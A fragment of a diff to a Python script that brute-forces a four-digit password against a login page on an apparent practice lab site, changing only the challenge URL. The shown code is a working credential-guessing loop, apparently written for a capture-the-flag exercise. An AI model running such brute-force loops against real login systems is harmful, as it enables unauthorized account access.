@@ -14,7 +14,7 @@ value = {
 
 for i in range(1000, 10000):
 	value['pwd'] = i
-	r = s.post('http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php',headers=header,data=value)
+	r = s.post('http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php',headers=header,data=value)
 	r.encoding = 'utf-8'
 	if 'error' not in r.text:
 		print('find pwd: %d ' % i)
